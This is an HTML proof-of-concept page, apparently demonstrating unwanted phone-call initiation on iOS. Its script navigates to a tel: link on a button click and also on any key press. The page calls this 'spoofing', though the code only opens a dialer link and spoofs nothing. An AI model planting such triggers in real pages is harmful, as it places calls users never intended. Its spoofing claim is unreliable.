<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Phone Call Spoofing on iOS</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 20px;
    }
    h2 {
      font-size: 24px;
    }
    p {
      font-size: 18px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      cursor: pointer;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h2>PoC for Phone Call Spoofing on iOS</h2>

  <p>Click the button below to initiate a spoofed phone call.</p>
  
  <!-- Button to trigger phone call -->
  <button id="callButton">Make Phone Call</button>

  <script>
    // Function to initiate the phone call
    function initiatePhoneCall() {
      // Replace with any phone number (spoofed number here)
      const spoofedPhoneNumber = "tel:+11234567890"; // Example number, replace as needed
      window.location.href = spoofedPhoneNumber;
    }

    // Adding event listener to the button
    document.getElementById('callButton').addEventListener('click', function() {
      initiatePhoneCall();
    });

    // Listen for keyboard input (optional for trigger)
    window.addEventListener('keydown', function() {
      initiatePhoneCall();
    });
  </script>

</body>
</html>
